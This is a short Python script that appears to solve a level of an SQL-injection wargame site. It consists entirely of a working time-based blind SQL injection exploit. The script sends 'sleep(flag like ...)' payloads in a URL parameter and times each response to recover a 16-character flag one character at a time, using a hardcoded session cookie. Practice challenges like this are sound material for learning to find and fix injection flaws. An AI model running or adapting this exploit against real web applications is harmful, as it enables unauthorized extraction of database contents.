#!/usr/bin/env python
# -*- coding: utf8 -*-
import requests
import threading
import time 
_string = "1234567890abcdefghijklmnopqrstuvwxyz"
time_out = 1.5

def run():
	key = ""
	url = "https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php"
	headers = {'Host': 'los.eagle-jump.org', 'Cookie': 'PHPSESSID=8bu5j13iivrvlot0uesdb4mtm0;'}
	for i in range(1, 16 + 1):
		for s in _string:
			START = time.time()
			payload = '?flag=sleep(flag like "{}%") ^ (select 1 union select 2)'.format(key + s)
			r = requests.get(url + payload, headers=headers)
			END = time.time()
			Time_counter = END - START
			if Time_counter > time_out:
				key = key + s
				print("No.{} Found Key: {}".format(i, s))
				break
	print("All Key => {}".format(key))

if __name__ == '__main__':
	run()